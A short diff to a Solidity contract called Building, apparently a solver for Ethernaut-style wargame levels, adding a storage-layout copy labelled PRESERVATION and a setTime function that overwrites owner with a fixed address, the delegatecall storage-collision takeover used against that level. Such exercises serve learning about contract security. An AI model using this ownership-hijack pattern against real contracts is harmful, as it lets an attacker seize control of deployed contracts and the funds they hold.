@@ -121,6 +121,17 @@ contract Building {
       bytes8(uint64(18446744073709551615) ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))))));
       require(result);
   }
+
+  //PRESERVATION
+  //   address public timeZone1Library;
+  // address public timeZone2Library;
+  // address public owner; 
+  // uint public storedTime;
+
+  function setTime(uint256 hack) public{
+      owner = 0x28E0E8d05a4c133a8B22210634Cd2CfA012d1b15;
+  }
+
   // to support receiving ETH by default
   receive() external payable {
     //revert("youcan't"); for king
